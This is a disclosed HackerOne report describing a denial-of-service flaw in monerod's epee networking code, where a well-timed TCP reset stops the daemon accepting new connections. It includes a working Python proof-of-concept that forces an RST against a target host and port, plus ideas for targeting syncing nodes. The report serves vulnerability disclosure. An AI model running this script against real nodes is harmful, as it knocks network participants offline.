# monerod can be disabled by a well-timed TCP reset packet

## Report Details
- **Report ID**: 363714
- **URL**: https://hackerone.com/reports/363714
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2018-06-09T12:09:17.963Z
- **Disclosed**: 2018-08-02T00:12:35.066Z

## Reporter
- **Username**: ahook
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: monero

## Vulnerability Information
**Summary:**
A well-timed TCP reset (RST) can cause monerod (or any service relying on epee) to stop accepting new connections.

**Description:**
When a new connection is attempted, the handle_accept function is called. This does some error checking and finishes setting up the connection. Once the connection is set up, it calls acceptor_.async_accept() in order to continue listening for new connections.

https://github.com/monero-project/monero/blob/8a7b3ff13858c5d879530c99de5c723c88429342/contrib/epee/include/net/abstract_tcp_server2.inl#L982

However, if the handle_accept function is called with an error code, it bypasses the main block of code and simply logs a message. It does not add the accept handler back to the acceptor. The result is that the daemon will stop accepting new connections if an error is hit.

It is possible for an attacker to remotely trigger such an error. If a TCP RST packet is sent immediately after a successful TCP handshake, the connection/socket will be torn down. If it happens fast enough (specifically in the window between the server receiving the ACK and the handle_accept function being called), this will cause an error.

## Releases Affected:

All releases using epee.

## Steps To Reproduce:

I've included a python script below which demonstrates a normal TCP connection that ends gracefully, and a malicious connection which causes an RST to be sent at close as opposed to FIN.

If this is run on a relatively idle node (e.g. if it's still synchronizing its blockchain), it will disable the node after just a couple tries. If a node is fully active, it becomes harder to get the RST processed within the critical window. I have yet to disable a fully active node, but it should be possible. A more efficient/faster attack going over raw sockets might make it easier.

## Supporting Material/References:

$ ./rst-attack.py <ip> <port>
```
#!/usr/bin/env python3
  
import socket, struct, sys

tgt_host = sys.argv[1]
tgt_port = int(sys.argv[2])

# Normal connection, send some data, end with graceful FIN.
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
s.connect((tgt_host, tgt_port))
s.send(b"hello")
s.close()

# Abnormal connection, force close by RST instead of FIN.
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
l_onoff = 1
l_linger = 0
p=struct.pack('ii', l_onoff, l_linger)
s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, p)
s.connect((tgt_host, tgt_port))
s.close()
```

## Impact

An attacker can remotely disable monero nodes. I marked this as medium since my proof-of-concept script fails to disable most active nodes. However, it is theoretically possible to take down the whole network if a clever variation or different means of causing an accept error is discovered.

An attacker could also monitor the network and snipe any nodes that have lagged behind or are in the middle of syncing the chain.

## Attachments
No attachments
